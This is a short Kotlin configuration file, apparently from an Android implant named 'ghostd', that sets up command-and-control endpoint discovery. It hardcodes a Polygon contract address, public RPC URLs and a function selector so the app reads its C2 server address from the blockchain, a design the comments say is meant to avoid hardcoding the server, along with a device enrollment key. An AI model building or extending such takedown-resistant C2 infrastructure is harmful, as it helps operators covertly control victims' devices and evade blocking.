package com.tg.ghostd

/**
 * C2 endpoint discovery configuration.
 *
 * The server address is NOT hardcoded in the app: it is read from a public
 * EVM contract via `eth_call` (function `endpoint() view returns (string)`).
 * Only the contract address and the public RPC list are baked in.
 *
 * Deployed 2026-10-25 on Polygon mainnet by the owner's wallet
 * (deploy tx 0x98b624368a1d24059144cec029f7dc2aee2e663abed6926a6377e68f8b48d038).
 */
object C2 {
    const val CONTRACT_ADDRESS = "0x7428945335ac4147369c48bb95d573ab5198e8af"

    val RPC_URLS = listOf(
        "https://polygon.publicnode.com",
        "https://polygon.drpc.org",
        "https://polygon-mainnet.gateway.tatum.io",
        "https://1rpc.io/matic"
    )

    /** keccak256("endpoint()")[0..3] = 5e280f11 */
    const val ENDPOINT_SELECTOR = "5e280f11"

    /**
     * Device enrollment shared secret sent in every "hello". MUST match the
     * server's enroll key (server GHOST_ENROLL_KEY / enroll.key). Regenerated
     * at deploy time — change it in this one place only.
     */
    const val ENROLL_KEY = "changeme-enroll-0"
}
